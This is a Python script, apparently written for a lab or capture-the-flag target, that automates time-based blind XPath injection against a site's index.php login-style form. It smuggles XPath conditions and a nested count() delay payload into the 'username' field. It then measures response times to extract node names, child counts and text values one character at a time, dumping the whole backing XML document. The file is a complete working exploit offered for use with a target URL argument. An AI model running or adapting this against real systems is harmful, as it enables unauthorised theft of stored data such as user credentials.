import requests
import urllib3
import argparse
import sys
import time
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(
    description="XPath time-based blind injection dumper.",
    epilog=f"Example: {sys.argv[0]} -t http://example.com")
parser.add_argument("-t", "--target", required=True, type=str, help="URL of the target, including the port.")
args = parser.parse_args()

URL = args.target.rstrip("/").strip()
MESSAGE_URL = f"{URL}/index.php"
letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits + '_-.:')
charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits + ' _-@.{}:/?!=+#()\'\"')

# Nested count payload for time delay
DELAY_PAYLOAD = "count((//.)[count((//.)[count((//.)[count((//.)[count((//.)[count((//.))])])])])])"
THRESHOLD = 1.5  # seconds - adjust based on your observed delay

def is_true(s, condition):
    """Send payload and return True if response is delayed (condition is true)"""
    msg_data = {
        "username": f"invalid' or {condition} and {DELAY_PAYLOAD} and '1'='1",
        "msg": "test"
    }
    start = time.time()
    r = s.post(url=MESSAGE_URL, data=msg_data, verify=False)
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def get_node_length(s, path):
    node_length = 1
    while True:
        condition = f"string-length(name({path}))={node_length}"
        if is_true(s, condition):
            return node_length
        node_length += 1

def get_node_name(s, path, length):
    node_name = ""
    for i in range(1, length + 1):
        for char in letters:
            condition = f"substring(name({path}),{i},1)='{char}'"
            if is_true(s, condition):
                node_name += char
                print(f"    [*] Found: {node_name}", end='\r')
                break
    print()
    return node_name

def get_number_of_children(s, path):
    condition = f"count({path}/*)=0"
    if is_true(s, condition):
        return 0
    
    number_of_children = 1
    while True:
        condition = f"count({path}/*)={number_of_children}"
        if is_true(s, condition):
            return number_of_children
        number_of_children += 1

def get_text_length(s, path):
    text_length = 0
    while True:
        condition = f"string-length({path})={text_length}"
        if is_true(s, condition):
            return text_length
        text_length += 1

def get_text(s, path, length):
    text = ""
    for i in range(1, length + 1):
        for char in charset:
            condition = f"substring({path},{i},1)='{char}'"
            if is_true(s, condition):
                text += char
                print(f"    [*] Found: {text}", end='\r')
                break
    print()
    return text

def explore_node(s, path, indent=0):
    """Explore a node and all its children recursively"""
    prefix = "    " * indent
    
    node_length = get_node_length(s, path)
    node_name = get_node_name(s, path, node_length)
    
    num_children = get_number_of_children(s, path)
    
    if num_children == 0:
        text_length = get_text_length(s, path)
        text_value = get_text(s, path, text_length)
        print(f"{prefix}{node_name}: {text_value}")
    else:
        print(f"{prefix}[+] {node_name} ({num_children} children)")
        for i in range(1, num_children + 1):
            child_path = f"{path}/*[{i}]"
            explore_node(s, child_path, indent + 1)

if __name__ == "__main__":
    s = requests.Session()
    print("[*] Starting time-based exploration...")
    print(f"[*] Using threshold: {THRESHOLD}s")
    explore_node(s, "/*[1]")
